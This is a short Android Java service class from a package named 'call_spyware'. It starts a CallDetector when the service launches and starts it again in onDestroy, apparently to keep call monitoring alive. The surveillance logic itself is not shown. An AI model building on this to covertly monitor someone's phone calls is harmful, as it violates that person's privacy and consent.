package com.ngpmbewetu.call_spyware;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;

@SuppressLint("Registered")
public class CallDetectorService extends Service {
    private CallDetector callDetector;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        callDetector = new CallDetector(this);

        int r = super.onStartCommand(intent, flags, startId);
        callDetector.start();
        return r;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        callDetector.start();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
